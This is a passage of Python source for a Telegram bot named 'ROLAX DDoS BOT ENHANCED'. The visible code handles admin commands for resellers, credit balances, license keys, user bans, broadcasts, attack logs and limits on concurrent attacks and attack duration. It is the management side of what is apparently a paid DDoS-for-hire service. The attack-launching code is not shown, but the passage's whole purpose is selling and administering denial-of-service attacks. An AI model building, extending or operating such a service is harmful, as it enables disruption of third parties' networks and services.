        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/addreseller USER_ID", parse_mode="HTML")
        return
    
    add_reseller(args[1])
    bot.reply_to(message, f"✅ Reseller added: <code>{args[1]}</code>", parse_mode="HTML")

@bot.message_handler(commands=['removereseller'])
def removereseller_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/removereseller USER_ID", parse_mode="HTML")
        return
    
    if remove_reseller(args[1]):
        bot.reply_to(message, f"✅ Reseller removed: <code>{args[1]}</code>", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ Not a reseller", parse_mode="HTML")

@bot.message_handler(commands=['remove_reseller_balance'])
def remove_reseller_balance_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/remove_reseller_balance USER_ID", parse_mode="HTML")
        return
    
    success, msg = remove_reseller_balance(args[1])
    if success:
        bot.reply_to(message, f"✅ {msg}\nUser: <code>{args[1]}</code>", parse_mode="HTML")
    else:
        bot.reply_to(message, f"❌ {msg}", parse_mode="HTML")

@bot.message_handler(commands=['addbalance'])
def addbalance_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/addbalance USER_ID AMOUNT", parse_mode="HTML")
        return
    
    try:
        amount = int(args[2])
    except:
        bot.reply_to(message, "❌ Invalid amount", parse_mode="HTML")
        return
    
    new_balance = add_balance(args[1], amount)
    bot.reply_to(message, f"✅ +{amount} credits to <code>{args[1]}</code>\n💰 Balance: {new_balance}", parse_mode="HTML")

@bot.message_handler(commands=['resellers'])
def resellers_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    resellers = load_json(RESELLER_FILE, {})
    if not resellers:
        bot.reply_to(message, "📦 No resellers", parse_mode="HTML")
        return
    
    msg = "👥 RESELLERS:\n\n"
    for uid in resellers:
        balance = get_balance(uid)
        msg += f"🆔 <code>{uid}</code> | 💰 {balance} credits\n"
    
    bot.reply_to(message, msg[:4000], parse_mode="HTML")

@bot.message_handler(commands=['allkeys'])
def allkeys_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    msg = "🔑 ALL KEYS:\n\n"
    
    msg += "🟢 UNUSED:\n"
    if keys_data["unused"]:
        for key, info in list(keys_data["unused"].items())[:20]:
            msg += f"• <code>{key}</code>\n  ⏱️ {info['duration']}{info['unit']} | 👥 {info.get('redeemed_count', 0)}/{info.get('max_users', 1)}\n\n"
    else:
        msg += "None\n\n"
    
    msg += "🔴 USED:\n"
    if keys_data["used"]:
        for key, info in list(keys_data["used"].items())[:20]:
            user_id = info.get("used_by", "Unknown")
            msg += f"• <code>{key}</code>\n  👤 <code>{user_id}</code> | ⏱️ {info['duration']}{info['unit']}\n\n"
    else:
        msg += "None\n"
    
    bot.reply_to(message, msg[:4000], parse_mode="HTML")

@bot.message_handler(commands=['removekey'])
def removekey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/removekey KEY", parse_mode="HTML")
        return
    
    key = args[1]
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    if key in keys_data["unused"]:
        del keys_data["unused"][key]
        save_json(KEYS_FILE, keys_data)
        bot.reply_to(message, f"✅ Key removed (unused)", parse_mode="HTML")
    elif key in keys_data["used"]:
        user_id = keys_data["used"][key].get("used_by")
        if user_id:
            users = load_json(USER_FILE, {})
            if str(user_id) in users:
                del users[str(user_id)]
                save_json(USER_FILE, users)
                try:
                    bot.send_message(user_id, "⚠️ Your key was removed by admin", parse_mode="HTML")
                except:
                    pass
        
        del keys_data["used"][key]
        save_json(KEYS_FILE, keys_data)
        bot.reply_to(message, f"✅ Key removed (active) | User <code>{user_id}</code> access revoked", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ Key not found", parse_mode="HTML")

@bot.message_handler(commands=['users'])
def users_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    users = load_json(USER_FILE, {})
    if not users:
        bot.reply_to(message, "📦 No users", parse_mode="HTML")
        return
    
    msg = "👥 USERS:\n\n"
    for uid, info in list(users.items())[:30]:
        if info.get("banned"):
            status = "🚫 BANNED"
        else:
            try:
                expiry = datetime.datetime.fromisoformat(info["expiry"])
                if datetime.datetime.now() > expiry:
                    status = "⏰ EXPIRED"
                else:
                    remaining = expiry - datetime.datetime.now()
                    days = remaining.days
                    hours = remaining.seconds // 3600
                    status = f"✅ {days}d {hours}h left"
            except:
                status = "⚠️ Error"
        
        msg += f"🆔 <code>{uid}</code> | {status}\n"
    
    msg += f"\n📊 Total: {len(users)}"
    bot.reply_to(message, msg[:4000], parse_mode="HTML")

@bot.message_handler(commands=['removeuser'])
def removeuser_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/removeuser USER_ID", parse_mode="HTML")
        return
    
    target_user = args[1]
    users = load_json(USER_FILE, {})
    
    if target_user in users:
        key = users[target_user].get("key")
        if key:
            keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
            if key in keys_data["used"]:
                del keys_data["used"][key]
                save_json(KEYS_FILE, keys_data)
        
        del users[target_user]
        save_json(USER_FILE, users)
        
        try:
            bot.send_message(target_user, "⚠️ Your account removed by admin", parse_mode="HTML")
        except:
            pass
        
        bot.reply_to(message, f"✅ User <code>{target_user}</code> removed", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ User not found", parse_mode="HTML")

@bot.message_handler(commands=['removeuserkey'])
def removeuserkey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/removeuserkey USER_ID", parse_mode="HTML")
        return
    
    if remove_user_key(args[1]):
        try:
            bot.send_message(args[1], "⚠️ Your key removed by admin", parse_mode="HTML")
        except:
            pass
        bot.reply_to(message, f"✅ User <code>{args[1]}</code> key removed", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ User not found", parse_mode="HTML")

@bot.message_handler(commands=['extenduser'])
def extenduser_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/extenduser USER_ID DAYS", parse_mode="HTML")
        return
    
    target_user = args[1]
    try:
        extra_days = int(args[2])
    except:
        bot.reply_to(message, "❌ Invalid days", parse_mode="HTML")
        return
    
    users = load_json(USER_FILE, {})
    if target_user not in users:
        bot.reply_to(message, "❌ User not found", parse_mode="HTML")
        return
    
    current_expiry = datetime.datetime.fromisoformat(users[target_user]["expiry"])
    new_expiry = current_expiry + datetime.timedelta(days=extra_days)
    users[target_user]["expiry"] = new_expiry.isoformat()
    save_json(USER_FILE, users)
    
    key = users[target_user].get("key")
    if key:
        keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
        if key in keys_data["used"]:
            keys_data["used"][key]["expiry"] = new_expiry.isoformat()
            save_json(KEYS_FILE, keys_data)
    
    try:
        bot.send_message(target_user, f"✅ +{extra_days} days | New expiry: {new_expiry.strftime('%Y-%m-%d %H:%M')}", parse_mode="HTML")
    except:
        pass
    
    bot.reply_to(message, f"✅ User <code>{target_user}</code> +{extra_days} days", parse_mode="HTML")

@bot.message_handler(commands=['ban'])
def ban_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/ban USER_ID [reason]", parse_mode="HTML")
        return
    
    target = args[1]
    reason = " ".join(args[2:]) if len(args) > 2 else "No reason"
    
    banned_users = load_json(BANNED_FILE, {})
    banned_users[target] = {
        "banned_at": datetime.datetime.now().isoformat(),
        "reason": reason,
        "banned_by": str(message.from_user.id)
    }
    save_json(BANNED_FILE, banned_users)
    
    users = load_json(USER_FILE, {})
    if target in users:
        users[target]["banned"] = True
        save_json(USER_FILE, users)
    
    try:
        bot.send_message(target, f"🚫 BANNED\n\nReason: {reason}", parse_mode="HTML")
    except:
        pass
    
    bot.reply_to(message, f"✅ <code>{target}</code> banned", parse_mode="HTML")

@bot.message_handler(commands=['unban'])
def unban_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/unban USER_ID", parse_mode="HTML")
        return
    
    banned_users = load_json(BANNED_FILE, {})
    if args[1] in banned_users:
        del banned_users[args[1]]
        save_json(BANNED_FILE, banned_users)
        
        users = load_json(USER_FILE, {})
        if args[1] in users:
            users[args[1]]["banned"] = False
            save_json(USER_FILE, users)
        
        try:
            bot.send_message(args[1], "✅ UNBANNED\nYou can use the bot again", parse_mode="HTML")
        except:
            pass
        
        bot.reply_to(message, f"✅ <code>{args[1]}</code> unbanned", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ Not banned", parse_mode="HTML")

@bot.message_handler(commands=['bannedlist'])
def bannedlist_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    banned_users = load_json(BANNED_FILE, {})
    if not banned_users:
        bot.reply_to(message, "📦 No banned users", parse_mode="HTML")
        return
    
    msg = "🚫 BANNED:\n\n"
    for uid, info in banned_users.items():
        msg += f"🆔 <code>{uid}</code> | {info.get('reason', 'N/A')}\n"
    
    bot.reply_to(message, msg[:4000], parse_mode="HTML")

@bot.message_handler(commands=['logs'])
def logs_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
        with open(LOG_FILE, "rb") as f:
            bot.send_document(message.chat.id, f, caption="📋 Attack Logs")
    else:
        bot.reply_to(message, "📦 No logs", parse_mode="HTML")

@bot.message_handler(commands=['clearlogs'])
def clearlogs_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    with open(LOG_FILE, "w") as f:
        f.write("")
    bot.reply_to(message, "✅ Logs cleared", parse_mode="HTML")

@bot.message_handler(commands=['setlimit'])
def setlimit_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    global MAX_CONCURRENT_ATTACKS, MAX_ATTACK_DURATION, COOLDOWN_SECONDS
    
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, """╔══════════════════════════════╗
║    ❌ INVALID USAGE         ║
╚══════════════════════════════╝

/setlimit MAX_ATTACKS MAX_DURATION COOLDOWN""", parse_mode="HTML")
        return
    
    try:
        MAX_CONCURRENT_ATTACKS = int(args[1])
        MAX_ATTACK_DURATION = int(args[2])
        COOLDOWN_SECONDS = int(args[3])
        bot.reply_to(
            message,
            f"""✅ Limits Updated

⚔️ Max: {MAX_CONCURRENT_ATTACKS}
⏱️ Duration: {MAX_ATTACK_DURATION}s
🕐 Cooldown: {COOLDOWN_SECONDS}s""",
            parse_mode="HTML"
        )
    except:
        bot.reply_to(message, "❌ Invalid values", parse_mode="HTML")

@bot.message_handler(commands=['broadcast'])
def broadcast_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    broadcast_text = message.text.replace('/broadcast', '', 1).strip()
    if not broadcast_text:
        bot.reply_to(message, """╔══════════════════════════════╗
║    ❌ INVALID USAGE         ║
╚══════════════════════════════╝

/broadcast MESSAGE""", parse_mode="HTML")
        return
    
    users = load_json(USER_FILE, {})
    if not users:
        bot.reply_to(message, "📦 No users", parse_mode="HTML")
        return
    
    success = 0
    fail = 0
    for uid in users:
        try:
            bot.send_message(uid, f"📢 BROADCAST\n\n{broadcast_text}", parse_mode="HTML")
            success += 1
        except:
            fail += 1
    
    bot.reply_to(message, f"✅ Sent: {success} | ❌ Failed: {fail}", parse_mode="HTML")

@bot.message_handler(commands=['stats'])
def stats_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    users = load_json(USER_FILE, {})
    resellers = load_json(RESELLER_FILE, {})
    groups = load_approved_groups()
    banned = load_json(BANNED_FILE, {})
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    active_users = 0
    for uid, info in users.items():
        if not info.get("banned", False):
            try:
                expiry = datetime.datetime.fromisoformat(info["expiry"])
                if datetime.datetime.now() <= expiry:
                    active_users += 1
            except:
                pass
    
    stats_msg = (
        f"""╔══════════════════════════════╗
║     📊 STATISTICS          ║
╚══════════════════════════════╝

👥 Active Users: {active_users}
💰 Resellers: {len(resellers)}
👥 Groups: {len(groups)}
🚫 Banned: {len(banned)}
🔑 Unused Keys: {len(keys_data['unused'])}
🔴 Active Keys: {len(keys_data['used'])}
⚔️ Active Attacks: {len(active_attacks)}/{MAX_CONCURRENT_ATTACKS}

⚙️ Limits:
Max Concurrent: {MAX_CONCURRENT_ATTACKS}
Max Duration: {MAX_ATTACK_DURATION}s
Cooldown: {COOLDOWN_SECONDS}s"""
    )
    
    bot.reply_to(message, stats_msg, parse_mode="HTML")

@bot.message_handler(commands=['systeminfo'])
def systeminfo_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    info = get_system_info()
    bot.reply_to(message, f"<pre>{info}</pre>", parse_mode="HTML")

# ==================== AI CHAT HANDLER ====================
@bot.message_handler(func=lambda message: True, content_types=['text'])
def ai_chat_handler(message):
    # Ignore commands
    if message.text and message.text.startswith('/'):
        return
    
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    user_message = message.text
    
    # Show typing
    bot.send_chat_action(message.chat.id, 'typing')
    
    # Get AI response
    ai_response = get_ai_response(user_id, user_message, username)
    
    # Send response
    bot.reply_to(message, ai_response)

# ==================== HANDLE GROUP MESSAGES ====================
@bot.message_handler(func=lambda message: message.chat.type in ["group", "supergroup"] and message.text and message.text.startswith('/'))
def group_command_handler(message):
    pass

# ==================== START BOT ====================
if __name__ == "__main__":
    print("=" * 50)
    print("🤖 ROLAX DDoS BOT ENHANCED")
    print("=" * 50)
    print(f"👑 Owner ID: {OWNER_ID}")
    print(f"🔗 API: {API_URL}")
    print(f"🤖 AI: DeepSeek v4 Pro")
    print(f"⚔️ Max Concurrent: {MAX_CONCURRENT_ATTACKS}")
    print(f"⏱️ Max Duration: {MAX_ATTACK_DURATION}s")
    print(f"🕐 Cooldown: {COOLDOWN_SECONDS}s")
    print("=" * 50)
    
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
